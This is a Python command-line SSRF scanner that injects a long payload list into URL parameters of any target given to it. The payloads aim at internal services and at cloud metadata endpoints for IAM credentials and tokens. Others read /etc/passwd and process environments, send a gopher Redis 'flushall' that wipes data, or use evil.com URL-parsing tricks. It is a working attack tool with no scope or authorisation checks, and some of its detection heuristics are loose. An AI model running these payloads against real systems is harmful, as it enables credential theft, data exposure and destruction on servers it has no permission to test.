#!/usr/bin/env python3
"""
SSRF Scanner — Test for Server-Side Request Forgery
Usage: python3 ssrf_scanner.py <url>
"""

import sys
import json
import re
import requests
from urllib.parse import urlparse, urlencode

requests.packages.urllib3.disable_warnings()

# SSRF payloads targeting internal services
SSRF_PAYLOADS = [
    # Basic internal
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",  # Octal
    "http://0x7f000001",  # Hex
    "http://2130706433",  # Decimal
    "http://0x7f.0x00.0x00.0x01",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5000",
    "http://127.0.0.1:9090",
    "http://127.0.0.1:6379",  # Redis
    "http://127.0.0.1:27017",  # MongoDB
    "http://127.0.0.1:3306",  # MySQL
    "http://127.0.0.1:5432",  # PostgreSQL
    "http://127.0.0.1:9200",  # Elasticsearch
    "http://127.0.0.1:11211",  # Memcached
    
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/computeMetadata/v1/",  # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",  # DigitalOcean
    "http://169.254.169.254/metadata/instance",  # Azure
    
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ip-address/0/publicIpAddress",
    
    # Internal services
    "http://internal",
    "http://intranet",
    "http://admin.local",
    "http://metadata",
    "http://consul:8500",
    "http://etcd:2379",
    "http://vault:8200",
    "http://kubernetes.default.svc",
    
    # DNS rebinding
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
    "http://nip.io",
    "http://sslip.io",
    
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:25/_HELO",
    "file:///etc/passwd",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "dict://127.0.0.1:6379/info",
    
    # Via URL parsing
    "http://127.0.0.1@evil.com",
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#.evil.com",
    "http://127.0.0.1?.evil.com",
]

# URL parameters that might be vulnerable
SSRF_PARAMS = [
    "url", "uri", "link", "href", "src", "source", "target",
    "dest", "destination", "redirect", "return", "next",
    "feed", "fetch", "load", "download", "proxy", "gateway",
    "callback", "webhook", "hook", "endpoint", "server",
    "host", "address", "ip", "port", "site", "page",
    "file", "path", "document", "image", "img", "avatar",
    "logo", "icon", "thumbnail", "thumb", "preview",
    "api", "api_url", "api_endpoint", "base_url", "api_server",
    "ref", "referer", "origin", "from", "to",
    "include", "require", "import", "read", "get",
    "open", "view", "show", "display", "render",
    "ping", "check", "test", "verify", "validate",
    "curl", "wget", "request", "http", "https",
]

def check_ssrf(url, param, payload):
    """Test if a parameter is vulnerable to SSRF"""
    try:
        separator = "&" if "?" in url else "?"
        test_url = f"{url}{separator}{param}={payload}"
        
        r = requests.get(test_url, timeout=12, verify=False,
                        headers={"User-Agent": "Mozilla/5.0"})
        
        body = r.text.lower()
        status = r.status_code
        
        # Check for SSRF indicators
        indicators = {
            "aws_metadata": "ami-id" in body or "instance-id" in body or "iam" in body,
            "gcp_metadata": "compute" in body or "project" in body,
            "file_read": "root:" in body or "/bin/bash" in body or "/bin/sh" in body,
            "internal_service": "redis" in body or "memcache" in body or "elasticsearch" in body,
            "aws_creds": "accesskey" in body or "secretkey" in body or "token" in body,
            "error_leak": "connection refused" not in body and "timeout" not in body and len(body) > 100,
            "status_change": status == 200 and payload not in ["http://evil.com"],
        }
        
        triggered = [k for k, v in indicators.items() if v]
        
        if triggered:
            return {
                "vulnerable": True,
                "param": param,
                "payload": payload,
                "status": status,
                "indicators": triggered,
                "body_preview": r.text[:500],
                "url": test_url
            }
        
        return {"vulnerable": False, "param": param, "payload": payload, "status": status}
    except requests.exceptions.ConnectionError:
        return {"vulnerable": False, "param": param, "payload": payload, "error": "Connection refused"}
    except requests.exceptions.Timeout:
        return {"vulnerable": False, "param": param, "payload": payload, "error": "Timeout"}
    except Exception as e:
        return {"vulnerable": False, "param": param, "error": str(e)}

def scan_url(url):
    """Scan URL for SSRF vulnerabilities"""
    parsed = urlparse(url)
    
    print(f"\n{'='*60}")
    print(f"🌐 SSRF Scanner")
    print(f"Target: {url}")
    print(f"{'='*60}\n")
    
    # Find potential SSRF params in URL
    existing_params = []
    from urllib.parse import parse_qs
    if parsed.query:
        existing_params = list(parse_qs(parsed.query).keys())
    
    # Get page content to find more params
    print("📡 Fetching page to find SSRF-prone parameters...")
    try:
        r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        html = r.text
        
        # Find params in HTML
        found_params = set()
        for param in SSRF_PARAMS:
            if param.lower() in html.lower():
                found_params.add(param)
        
        # Find URL patterns in HTML
        url_patterns = re.findall(r'https?://[^\s\'"<>]+', html)
        if url_patterns:
            print(f"  Found {len(url_patterns)} URLs in page (may indicate URL fetching)")
        
        found_params.update(existing_params)
        print(f"  Found {len(found_params)} potential SSRF parameters\n")
    except Exception as e:
        print(f"  ❌ Error: {e}")
        found_params = set()
    
    # Test parameters
    all_params = list(found_params) + [p for p in SSRF_PARAMS[:15] if p not in found_params]
    
    vulnerable = []
    results = []
    
    print(f"🔎 Testing {len(all_params)} params × {len(SSRF_PAYLOADS[:20])} payloads...\n")
    
    # Only test critical payloads first (fast)
    critical_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance",
        "file:///etc/passwd",
        "http://0x7f000001",
        "http://127.0.0.1:8080",
    ]
    
    for param in all_params:
        for payload in critical_payloads:
            result = check_ssrf(url, param, payload)
            results.append(result)
            
            if result.get("vulnerable"):
                vulnerable.append(result)
                print(f"  🔴 SSRF FOUND!")
                print(f"     Param: {param}")
                print(f"     Payload: {payload}")
                print(f"     Indicators: {result['indicators']}")
                print(f"     Preview: {result.get('body_preview', '')[:100]}")
                print()
                break
    
    # Deep scan if requested
    if not vulnerable:
        print("  ⏳ No critical payloads triggered, trying extended list...")
        for param in all_params[:5]:
            for payload in SSRF_PAYLOADS[8:30]:
                result = check_ssrf(url, param, payload)
                if result.get("vulnerable"):
                    vulnerable.append(result)
                    print(f"  🔴 SSRF FOUND!")
                    print(f"     Param: {param}, Payload: {payload}")
                    break
    
    # Summary
    print(f"\n{'='*60}")
    print(f"📊 SSRF RESULTS")
    print(f"{'='*60}")
    print(f"Parameters tested: {len(all_params)}")
    print(f"Vulnerable: {len(vulnerable)}")
    
    if vulnerable:
        print(f"\n🔴 SSRF VULNERABILITIES:")
        for v in vulnerable:
            print(f"\n  Parameter: {v['param']}")
            print(f"  Payload: {v['payload']}")
            print(f"  Indicators: {v.get('indicators', [])}")
            print(f"  PoC: {v.get('url', '')[:100]}")
    else:
        print("\n✅ No SSRF found")
    
    # Save
    import os
    os.makedirs("output", exist_ok=True)
    domain = parsed.netloc.replace(".", "_")
    outfile = f"output/ssrf_{domain}.json"
    with open(outfile, "w") as f:
        json.dump(vulnerable, f, indent=2)
    print(f"\n💾 Saved to {outfile}")
    
    return vulnerable

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_scanner.py <url>")
        print("Example: python3 ssrf_scanner.py https://example.com/api/fetch?url=http://")
        sys.exit(1)
    scan_url(sys.argv[1])
